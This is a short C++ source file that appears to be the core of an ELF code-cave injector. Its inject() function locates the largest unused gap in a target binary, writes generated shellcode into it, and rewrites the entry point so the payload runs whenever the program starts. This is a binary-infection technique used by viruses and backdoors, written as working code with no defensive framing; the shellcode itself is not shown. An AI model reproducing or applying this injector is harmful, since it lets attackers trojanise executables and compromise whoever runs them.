#include "inject.hpp"
#include "elf_handler.hpp"
#include <iostream>

using namespace std;

namespace injector {

void inject(Elf_target &elf) {
  elf.load_headers();
  if (!elf.is_elf()) {
    throw invalid_argument{"file is not elf"};
  }

  const auto code_cave = elf.find_biggest_code_cave();
  const auto shellcode = shellcode::make_shellcode();

  if (code_cave.size < shellcode.size()) {
    throw runtime_error{"can't find a big enough code cave"};
  }

  elf.write_shellcode(shellcode, code_cave);

  auto text_offset = elf.get_text_segment_offset();
  elf.change_entry_point(text_offset + code_cave.offset);
}

} // namespace injector
